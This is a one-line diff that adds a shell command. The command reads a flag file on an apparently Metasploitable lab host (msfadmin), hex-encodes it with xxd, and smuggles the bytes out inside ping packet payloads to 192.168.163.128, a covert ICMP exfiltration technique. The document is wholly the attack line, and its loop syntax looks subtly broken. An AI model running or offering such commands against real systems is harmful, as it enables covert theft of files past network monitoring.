@@ -1,0 +1,1 @@
+CMD="cat /home/msfadmin/flag.png; OUTPUT=$($CMD | xxd -p -c 16); for i in $OUTPUT[@]; do ping -c 1 -p $i 192.168.163.128; done
